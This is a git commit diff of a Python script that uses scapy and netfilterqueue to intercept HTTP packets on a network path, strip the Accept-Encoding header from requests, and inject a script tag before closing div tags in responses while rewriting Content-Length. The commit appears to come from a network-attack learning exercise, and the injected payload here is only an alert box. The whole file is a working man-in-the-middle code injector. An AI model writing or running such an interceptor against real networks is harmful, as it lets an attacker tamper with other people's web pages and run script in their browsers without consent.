d7f26f59f72f143c47d68174f3c9850eb03aba07
Madhav Anand <madhav1004@icloud.com>
2021-01-25 13:17:41 +0530

    fixed error of not having an ending body tag with div.

--- main.py
+++ main.py
@@ -18,30 +18,35 @@ def set_load(packet, load):
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] Request")
 
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+    try:
+        if scapy_packet.haslayer(scapy.Raw):
+            if scapy_packet[scapy.TCP].dport == 80:
+                print("[+] Request")
 
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] Response")
-
-            injection_code = "<script>alert('test')</script>"
-
-            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code + "</body>")
-            length_search = re.search("(?:Content-Length:\s)(\d*)", modified_load)
-            length = length_search.group(1)
-
-            new_length = int(length) + len(injection_code)
-            # modified_load = modified_load.replace(length, str(new_length))
-
-            if modified_load != scapy_packet[scapy.Raw].load:
+                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
                 new_packet = set_load(scapy_packet, modified_load)
-                print("modified load", modified_load)
                 packet.set_payload(str(new_packet))
+
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("[+] Response")
+
+                injection_code = "<script>alert('test')</script>"
+
+                modified_load = scapy_packet[scapy.Raw].load.replace("</div>", injection_code + "</div>")
+
+                length_search = re.search("(?:Content-Length:\s)(\d*)", modified_load)
+                print("modified", scapy_packet.show(), modified_load)
+                length = length_search.group(1)
+
+                new_length = int(length) + len(injection_code)
+                modified_load = modified_load.replace(length, str(new_length))
+
+                if modified_load != scapy_packet[scapy.Raw].load:
+                    new_packet = set_load(scapy_packet, modified_load)
+                    packet.set_payload(str(new_packet))
+    except Exception:
+        vary = "harry"
 
     packet.accept()
 
@@ -49,4 +54,3 @@ def process_packet(packet):
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
-
